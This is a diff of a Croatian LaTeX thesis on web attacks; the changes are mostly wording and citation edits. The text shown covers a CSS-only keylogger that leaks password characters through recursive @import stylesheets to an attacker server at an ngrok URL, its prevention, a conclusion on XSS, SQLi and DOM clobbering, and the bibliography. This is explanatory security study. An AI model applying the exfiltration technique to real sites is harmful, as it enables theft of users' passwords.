+Iako napadač ima način na koji može doznati koje slovo je korisnik unio, to i dalje zahtjeva da za prvo slovo lozinke napadač napravi CSS dokument s 223 pravila, pomoću kojih se šalje HTTP zahtjev za prvo slovo lozinke. Kako lozinke općenito imaju minimalno 8 znakova to bi zahtijevalo jedno CSS pravilo za svaku kombinaciju tih 8 znakova, što bi značilo ukupno \(6.11 \times 10^{18}\) CSS pravila.
 
-Kako bi se drastično smanjio potreban broj CSS pravila koje je potrebno napisati, napadač može napraviti da server, kojem keylogger javlja uneseno slovo, generira novi CSS dokument koji sadrži 223 pravila koje za vrijednost prvog slova lozinke imaju postavljenu vrijednost koju CSS keylogger javi. Na primjer, ako je prvo slovo lozinke \texttt{a} tada će CSS pravilo, koje javlja da je drugo uneseno slovo \texttt{b}, imati oblik prikazan na slici \ref{fig:css_sl}.
+Kako bi se drastično smanjio potreban broj CSS pravila koje je potrebno napisati, napadač može napraviti da server, kojem keylogger javlja uneseno slovo, generira novi CSS dokument koji sadrži 223 pravila koje za vrijednost prvog slova lozinke imaju postavljenu vrijednost koju CSS keylogger javi. Na primjer, ako je prvo slovo lozinke, slovo \texttt{a}, tada će CSS pravilo, koje javlja da je drugo uneseno slovo \texttt{b}, imati oblik prikazan na slici \ref{fig:css_sl}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1598,9 +1642,9 @@ Ovo znači da CSS dokumenti koje napadačev server šalje trebaju biti rekurzivn
 	\end{center}
 \end{figure}
 
-Server funkcionira tako da prilikom njegovog pokretanja se stvara 150 obećanja (eng. promise) u nizu, gdje svako obećanje predstavlja jedno slovo. Kada CSS keylogger pošalje HTTP zahtjev koji u upitnom (eng. query) dijelu zahtjeva ima \texttt{leak} svojstvo koje sadrži vrijednost unesenog slova. Kada server primi opisani HTTP zahtjev dobiveno slovo se nadodaje u niz znakova, koji predstavljaju lozinku, te se rješava (eng. resolve) obećanje koje se nalazi na onom mjestu u nizu koje odgovara rednom broju slova u unesenoj loznici. Rekurzivni CSS dokumenti zatražuju CSS dokument za sljedeće slovo tako da se šalje HTTP zahtjev oblika \texttt{http://0efed9103e27.ngrok.io/?l=2}, gdje svojstvo \texttt{l} označava za koje slovo po redu u loznici se treba generirati CSS dokument kao odgovor na ovaj HTTP zahtjev. Kada server primi ovakav zahtjev, čeka se da CSS keylogger javi vrijednost prethodnog slova, nakon čega server generira CSS dokument, kojega šalje kao odgovor na HTTP zahtjev. Ovo je prikazano na slici \ref{fig:css_ser3}. Funkcija \texttt{generate\_CSS}, prikazana na slici \ref{fig:css_ser}, prima redni broj slova u loznici, za koje se stvaraju pravila, te dosadašnja slova koja je CSS keylogger poslao. CSS pravila se pišu prema uzorku koji je pohranjen u varijablu \texttt{data}. Prvo što se upisuje u CSS dokument je \texttt{@import} pravilo kojim se šalje HTTP zahtjev za idući CSS dokument, nakon čega se  prišu CSS pravila za 223 ASCII znaka. Neki ASCII znakovi se escape-aju kako ne bi narušili strukturu CSS dokumenta. Na kraju HTTP zahtjeva za pojedino slovo se stavlja svojstvo \texttt{q} u upitni dio URL, u koji se stavlja nasumično generirani broj koji osigurava da u situaciji gdje se u loznici nalaze dva ista slova HTTP zahtjev bude poslan. U suprotnom web preglednik ne bi pokušao dohvatiti dokument koji se nalazi na već posjećenoj URL adresi.
+Server funkcionira tako da prilikom njegovog pokretanja se stvara 150 obećanja (eng. promise) u nizu, gdje svako obećanje predstavlja jedno slovo. Kada CSS keylogger pošalje HTTP zahtjev koji u upitnom (eng. query) dijelu zahtjeva ima \texttt{leak} svojstvo koje sadrži vrijednost unesenog slova, tada server dobiveno slovo nadodaje u niz znakova, koji predstavljaju lozinku, te se rješava (eng. resolve) obećanje koje se nalazi na onom mjestu u nizu koje odgovara rednom broju slova u loznici. Rekurzivni CSS dokumenti zatražuju CSS dokument za sljedeće slovo tako da se šalje HTTP zahtjev oblika \texttt{http://0efed9103e27.ngrok.io/?l=2}, gdje svojstvo \texttt{l} označava za koje slovo po redu u loznici se treba generirati CSS dokument kao odgovor na ovaj HTTP zahtjev. Kada server primi ovakav zahtjev, čeka se da CSS keylogger javi vrijednost trenutnog slova, nakon čega server generira CSS dokument, kojega šalje kao odgovor na HTTP zahtjev. Ovo je prikazano na slici \ref{fig:css_ser3}. Funkcija \texttt{generate\_CSS}, prikazana na slici \ref{fig:css_ser}, prima redni broj slova u loznici, za koje se stvaraju pravila, te dosadašnja slova koja je CSS keylogger poslao. CSS pravila se pišu prema uzorku koji je pohranjen u varijablu \texttt{data}. Prvo što se upisuje u CSS dokument je \texttt{@import} pravilo kojim se šalje HTTP zahtjev za idući CSS dokument, nakon čega se  pišu CSS pravila za 223 ASCII znaka. Neki ASCII znakovi se escape-aju kako ne bi narušili strukturu CSS dokumenta. Na kraju HTTP zahtjeva za pojedino slovo se stavlja svojstvo \texttt{q} u upitni dio URL, u koji se stavlja nasumično generirani broj koji osigurava da u situaciji gdje se u loznici nalaze dva ista slova, HTTP zahtjev i dalje bude poslan. U suprotnom web preglednik ne bi pokušao dohvatiti dokument koji se nalazi na već posjećenoj URL adresi.
 
-Primjer uspješnog izvlačenja lozinke se vidi na ispisu server, što je prikazano na slici \ref{fig:css_pass}.
+Primjer uspješnog izvlačenja lozinke se vidi na ispisu servera, što je prikazano na slici \ref{fig:css_pass}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1627,7 +1671,9 @@ Dokaz da je vrijednost lozinke uistinu ona koju je dobio sever se vidi na slici 
 	\end{center}
 \end{figure}
 
-Ovaj napad se može primijeniti na bilo koji tekstualni element koji se nalazi na stranici \cite{cssnapad1}.
+Ovaj napad se može primijeniti na bilo koji tekstualni element koji se nalazi na web stranici \cite{cssnapad1}.
+
+\pagebreak
 
 \subsection{Sprječavanje napada}
 Ovaj napad se može spriječiti tako da se u \texttt{href} atributu \texttt{link} elementa koristi apsolutna putanja do CSS dokumenta koja bi onemogućila prestanak primjenjivanjem CSS dokumenta na web stranicu dodavanjem znaka \texttt{/} na kraj URL-a.
@@ -1637,13 +1683,13 @@ Kako se ovaj napad zasniva na tome da se neki korisnički podatak, koji je prika
 Preporučuje se izbjegavanje korištenja softverskih okvira koji koriste kontrolirane komponente. Iako React ima kontrolirane komponente, ažuriranje vrijednosti \texttt{value} atributa nije zadano već je to preporučena programerska praksa kojom se upravljanje elementima oduzima od DOM-a i daje React-u.
 
 \chapter{ZAKLJUČAK}
-Iako su XSS i SQLi napadi poznati dizajnerima i sigurnosnim ekspertima koji kreiraju web stranice i tehnologije kojima bi se ovakvi napadi spriječili, i dalje je moguće izvest ove napade koji su postali složeniji i inovativniji u načinu na koji se zaobilaze prepreke koji dizajneri postavljaju u vlastite web stranice. Neke ranjivosti se mogu iskoristi zbog nepažnje korisnika, što se vidi u primjeru XSS napada preko upravitelja lozinki u poglavlju \ref{xss1}, dok su drugi napadi mogući zbog zastarjelih funkcionalnosti koje su i dalje podržane u modernim softverskim okvirima, što se dogodilo u napadu XSS ranjivost u ASP .NET-u u poglavlju \ref{xss2}. Poteškoća kod obrane od SQLi napada opisanog u poglavlju \ref{sqli} je složeni način testiranja za takve ranjivosti. Za razliku od drugih tipova SQLi napada koji rade promjene u radu web aplikacije, ova vrsta SQLi napada ne radi promjene u prikazu i ponašanju web aplikacije.
+Iako su XSS i SQLi napadi poznati dizajnerima i sigurnosnim ekspertima koji kreiraju web stranice i tehnologije kojima bi se ovakvi napadi spriječili, i dalje je moguće izvest ove napade koji su postali složeniji i inovativniji u načinu na koji oni zaobilaze prepreke koje dizajneri postavljaju u vlastite web stranice. Neke ranjivosti se mogu iskoristi zbog nepažnje korisnika, što se vidi u primjeru XSS napada preko upravitelja lozinki u poglavlju \ref{xss1}, dok su drugi napadi mogući zbog zastarjelih funkcionalnosti koje su i dalje podržane u modernim softverskim okvirima, što se dogodilo u napadu XSS ranjivost u ASP .NET-u u poglavlju \ref{xss2}. Poteškoća kod obrane od SQLi napada opisanog u poglavlju \ref{sqli} proizlazi iz složenog testiranja za takve ranjivosti. Za razliku od drugih tipova SQLi napada, koji rade promjene u radu web aplikacije, ova vrsta SQLi napada ne radi promjene u prikazu i ponašanju web aplikacije.
 
-Osim već poznatih tipova napada poput XSS i SQLi, dizajneri se moraju boriti i s novim oblicima napad kao što je DOM clobbering. Ovaj napad se može izvesti zbog programerskih praksi koje omogućavaju da se naruši način na koji referenciranja objekata. DOM clobbering ima potencijal zaobilaženja filtera kojima se upravo pokušavaju spriječiti druga vrsta napada odnosno XSS napadi.
+Osim već poznatih tipova napada poput XSS i SQLi, dizajneri se moraju boriti i s novim oblicima napad kao što je DOM clobbering. Ovaj napad se može izvesti zbog programerskih praksi koje omogućavaju da se naruši način referenciranja objekata. DOM clobbering ima potencijal zaobilaženja filtera kojima se upravo pokušavaju spriječiti druge vrste napada, odnosno XSS napadi.
 
-Pored DOM clobbering-a i XSS napada, koji su skriptni napadi koji zahtijevaju izvršavanje JavaScript koda, pronađeni su načini izvršavanja napada bez skripte kojima je omogućeno izvlačenje tajnih ili skrivenih podataka iz web stranice korištenjem samo CSS dokumenata.
+Pored DOM clobbering-a i XSS napada, koji su skriptni napadi te zahtijevaju izvršavanje JavaScript koda, pronađeni su načini izvršavanja napada bez skripte kojima je omogućeno izvlačenje tajnih ili skrivenih podataka iz web stranice korištenjem samo CSS dokumenata.
 
-Gotovo svi napadi se mogu spriječiti primjenom određene kombinacije metoda zaštite, ispravne konfiguracije korištenih tehnologije i primjene pravilnih programskih praksi, ali postoje ranjivosti, kao ona opisana u napadu XSS ranjivosti ASP .NET-u, koje su ugrađene u softverske okvire.
+Gotovo svi napadi se mogu spriječiti primjenom određene kombinacije metoda zaštite, ispravne konfiguracije korištenih tehnologija i primjene pravilnih programskih praksi, ali postoje ranjivosti, kao ona opisana u napadu XSS ranjivosti ASP .NET-u, koje su ugrađene u softverske okvire.
 
 %%%%%%%%%%%%%%%%%%%%%%% LITERATURA / BIBLIOGRAPHY %%%%%%%%%%%%%%%%%%%%%%%%%
 %\addcontentsline{toc}{chapter}{Literatura}
@@ -1651,35 +1697,35 @@ Gotovo svi napadi se mogu spriječiti primjenom određene kombinacije metoda za�
 \renewcommand{\bibname}{LITERATURA}
 \begin{spacing}{1}
 \begin{thebibliography}{99}
-	\bibitem{html} ,,HTML Tutorial'', s Interneta, \url{https://www.tutorialspoint.com/html/index.htm}
-	\bibitem{css_tut} ,,CSS Tutorial'', s Interneta, \url{https://www.tutorialspoint.com/css/index.htm}
-	\bibitem{js} ,,Javascript Tutorial'', s Interneta, \url{https://www.tutorialspoint.com/javascript/index.htm}
-	\bibitem{ajs} ,,About JavaScript'', s Interneta, \url{https://developer.mozilla.org/en-US/docs/Web/JavaScript/About_JavaScript}, 4. ožujka 2020.
-	\bibitem{expss} ,,ExpressJS - Overview'', s Interneta, \url{https://www.tutorialspoint.com/expressjs/expressjs_overview.htm}
-	\bibitem{aspnet} ,,ASP.NET - Introduction'', s Interneta, \url{https://www.tutorialspoint.com/asp.net/asp.net_introduction.htm}
-	\bibitem{wsh} ,,About Wireshark'', s Interneta, \url{https://www.wireshark.org/}
-	\bibitem{tpdump} ,,Manpage of TCPDUMP'', s Interneta, \url{https://www.tcpdump.org/manpages/tcpdump.1.html}, 2. ožujka 2020.
-	\bibitem{mssql} ,,MS SQL Server Tutorial'', s Interneta, \url{https://www.tutorialspoint.com/ms_sql_server/index.htm}
-	\bibitem{php} ,,PHP - Introduction'', s Interneta, \url{https://www.tutorialspoint.com/php/php_introduction.htm}
-	\bibitem{ranj} Jessica Ortega: ,,What is a Website Vulnerability and How Can it be Exploited?'', s Interneta, \url{https://www.sitelock.com/blog/what-is-a-website-vulnerability/}, 25. travanja 2017.
-	\bibitem{xsstut} ,,CROSS-SITE SCRIPTING (XSS) TUTORIAL: LEARN ABOUT XSS VULNERABILITIES, INJECTIONS AND HOW TO PREVENT ATTACKS'', s Interneta, \url{https://www.veracode.com/security/xss}
-	\bibitem{xssref} ,,Reflected XSS'', s Interneta, \url{https://portswigger.net/web-security/cross-site-scripting/reflected}
-	\bibitem{xssstor} ,,Stored XSS '', s Interneta, \url{https://portswigger.net/web-security/cross-site-scripting/stored}
-	\bibitem{xssdom} ,,DOM-based XSS'', s Interneta \url{https://portswigger.net/web-security/cross-site-scripting/dom-based}
-	\bibitem{xssport} ,,Cross-site scripting'', s Interneta \url{https://portswigger.net/web-security/cross-site-scripting}
-	\bibitem{domclob} ,,DOM clobbering'', s Interneta \url{https://portswigger.net/web-security/dom-based/dom-clobbering}
-	\bibitem{sitesqli} ,,SQL injection'', s Interneta \url{https://portswigger.net/web-security/sql-injection}
-	\bibitem{blndsqli} ,,Blind SQL injection'', s Interneta \url{https://portswigger.net/web-security/sql-injection/blind}
-	\bibitem{key} ,,WHAT IS A KEYLOGGER: A BRIEF ON A DANGEROUS AND MALICIOUS TOOL'', s Interneta, \url{https://enterprise.comodo.com/what-is-a-keylogger.php}
-	\bibitem{key2} ,,Keylogger'', s Interneta, \url{https://www.malwarebytes.com/keylogger/}
-	\bibitem{bind} Chris Buxton: ,,All About BIND DNS: Who, How, \& Why'', s Interneta, \url{https://linuxacademy.com/blog/linux/all-about-bind-dns-who-how-why/}, 14. sječnja 2020.
-	\bibitem{kali} ,,What is Kali Linux?'', s Interneta, \url{https://www.kali.org/docs/introduction/what-is-kali-linux/}, 19. svibnja 2019.
-	\bibitem{x2cpport} ,,Exploiting cross-site scripting vulnerabilities'', s Interneta, \url{https://portswigger.net/web-security/cross-site-scripting/exploiting}
-	\bibitem{domnapad} ,,Clobbering the clobbered — Advanced DOM Clobbering'', s Interneta, \url{https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94}, 26. rujna 2019.
-	\bibitem{dnsextr} Ryan Wendel: ,,DNS Exfiltration using SQLMap in a Microsoft SQL Environment'', s Interneta, \url{https://www.ryanwendel.com/2020/02/27/dns-exfiltration-using-sqlmap-in-a-mssql-environment/}, 27. veljače 2020.
-	\bibitem{annapad} Paweł Hałdrzyński: ,,All is XSS that comes to the .NET'', s Interneta, \url{https://blog.isec.pl/all-is-xss-that-comes-to-the-net/}, 8. studenog 2019.
-	\bibitem{cssnapad1} Paweł Hałdrzyński: ,,CSS Injection Primitives'', s Interneta, \url{https://x-c3ll.github.io/posts/CSS-Injection-Primitives/}, 16. listopada 2019.
-	\bibitem{cssnapad2} James Kettle: ,,Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities'', s Interneta, \url{https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities}, 17. veljače 2015.
+	\bibitem{html} ,,HTML Tutorial'', s Interneta, \url{https://www.tutorialspoint.com/html/index.htm}, zadnji put posjećeno 3. srpnja 2020.
+	\bibitem{css_tut} ,,CSS Tutorial'', s Interneta, \url{https://www.tutorialspoint.com/css/index.htm}, zadnji put posjećeno 3. srpnja 2020.
+	\bibitem{js} ,,Javascript Tutorial'', s Interneta, \url{https://www.tutorialspoint.com/javascript/index.htm}, zadnji put posjećeno 3. srpnja 2020.
+	\bibitem{ajs} ,,About JavaScript'', s Interneta, \url{https://developer.mozilla.org/en-US/docs/Web/JavaScript/About_JavaScript}, 4. ožujka 2020., zadnji put posjećeno 4. srpnja 2020.
+	\bibitem{expss} ,,ExpressJS - Overview'', s Interneta, \url{https://www.tutorialspoint.com/expressjs/expressjs_overview.htm}, zadnji put posjećeno 4. srpnja 2020.
+	\bibitem{aspnet} ,,ASP.NET - Introduction'', s Interneta, \url{https://www.tutorialspoint.com/asp.net/asp.net_introduction.htm}, zadnji put posjećeno 6. srpnja 2020.
+	\bibitem{wsh} ,,About Wireshark'', s Interneta, \url{https://www.wireshark.org/}, zadnji put posjećeno 7. srpnja 2020.
+	\bibitem{tpdump} ,,Manpage of TCPDUMP'', s Interneta, \url{https://www.tcpdump.org/manpages/tcpdump.1.html}, 2. ožujka 2020., zadnji put posjećeno 8. srpnja 2020.
+	\bibitem{mssql} ,,MS SQL Server Tutorial'', s Interneta, \url{https://www.tutorialspoint.com/ms_sql_server/index.htm}, zadnji put posjećeno 8. srpnja 2020.
+	\bibitem{php} ,,PHP - Introduction'', s Interneta, \url{https://www.tutorialspoint.com/php/php_introduction.htm}, zadnji put posjećeno 30. lipnja 2020.
+	\bibitem{ranj} Jessica Ortega: ,,What is a Website Vulnerability and How Can it be Exploited?'', s Interneta, \url{https://www.sitelock.com/blog/what-is-a-website-vulnerability/}, 25. travanja 2017., zadnji put posjećeno 12. srpnja 2020.
+	\bibitem{xsstut} ,,CROSS-SITE SCRIPTING (XSS) TUTORIAL: LEARN ABOUT XSS VULNERABILITIES, INJECTIONS AND HOW TO PREVENT ATTACKS'', s Interneta, \url{https://www.veracode.com/security/xss}, 4. studenog 2010., zadnji put posjećeno 13. srpnja 2020.
+	\bibitem{xssref} ,,Reflected XSS'', s Interneta, \url{https://portswigger.net/web-security/cross-site-scripting/reflected}, zadnji put posjećeno 13. srpnja 2020.
+	\bibitem{xssstor} ,,Stored XSS '', s Interneta, \url{https://portswigger.net/web-security/cross-site-scripting/stored}, zadnji put posjećeno 15. srpnja 2020.
+	\bibitem{xssdom} ,,DOM-based XSS'', s Interneta \url{https://portswigger.net/web-security/cross-site-scripting/dom-based}, zadnji put posjećeno 12. srpnja 2020.
+	\bibitem{xssport} ,,Cross-site scripting'', s Interneta \url{https://portswigger.net/web-security/cross-site-scripting}, zadnji put posjećeno 15. srpnja 2020.
+	\bibitem{domclob} ,,DOM clobbering'', s Interneta \url{https://portswigger.net/web-security/dom-based/dom-clobbering}, zadnji put posjećeno 13. srpnja 2020.
+	\bibitem{sitesqli} ,,SQL injection'', s Interneta \url{https://portswigger.net/web-security/sql-injection}27. studenog 2018., zadnji put posjećeno 15. srpnja 2020.
+	\bibitem{blndsqli} ,,Blind SQL injection'', s Interneta \url{https://portswigger.net/web-security/sql-injection/blind}, zadnji put posjećeno 15. srpnja 2020.
+	\bibitem{key} ,,WHAT IS A KEYLOGGER: A BRIEF ON A DANGEROUS AND MALICIOUS TOOL'', s Interneta, \url{https://enterprise.comodo.com/what-is-a-keylogger.php}, zadnji put posjećeno 15. srpnja 2020.
+	\bibitem{key2} ,,Keylogger'', s Interneta, \url{https://www.malwarebytes.com/keylogger/}, zadnji put posjećeno 15. srpnja 2020.
+	\bibitem{bind} Chris Buxton: ,,All About BIND DNS: Who, How, \& Why'', s Interneta, \url{https://linuxacademy.com/blog/linux/all-about-bind-dns-who-how-why/}, 14. sječnja 2020., zadnji put posjećeno 18. srpnja 2020.
+	\bibitem{kali} ,,What is Kali Linux?'', s Interneta, \url{https://www.kali.org/docs/introduction/what-is-kali-linux/}, 25. studenog 2019., zadnji put posjećeno 8. srpnja 2020.
+	\bibitem{x2cpport} ,,Exploiting cross-site scripting vulnerabilities'', s Interneta, \url{https://portswigger.net/web-security/cross-site-scripting/exploiting}, zadnji put posjećeno 16. srpnja 2020.
+	\bibitem{domnapad} ,,Clobbering the clobbered — Advanced DOM Clobbering'', s Interneta, \url{https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94}, 26. rujna 2019., zadnji put posjećeno 14. svibnja 2020.
+	\bibitem{dnsextr} Ryan Wendel: ,,DNS Exfiltration using SQLMap in a Microsoft SQL Environment'', s Interneta, \url{https://www.ryanwendel.com/2020/02/27/dns-exfiltration-using-sqlmap-in-a-mssql-environment/}, 27. veljače 2020., zadnji put posjećeno 10. svibnja 2020.
+	\bibitem{annapad} Paweł Hałdrzyński: ,,All is XSS that comes to the .NET'', s Interneta, \url{https://blog.isec.pl/all-is-xss-that-comes-to-the-net/}, 8. studenog 2019., zadnji put posjećeno 13. svibnja 2020.
+	\bibitem{cssnapad1} Paweł Hałdrzyński: ,,CSS Injection Primitives'', s Interneta, \url{https://x-c3ll.github.io/posts/CSS-Injection-Primitives/}, 16. listopada 2019., zadnji put posjećeno 27. svibnja 2020.
+	\bibitem{cssnapad2} James Kettle: ,,Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities'', s Interneta, \url{https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities}, 17. veljače 2015., zadnji put posjećeno 27. svibnja 2020.
 	
 \end{thebibliography}
 \end{spacing}
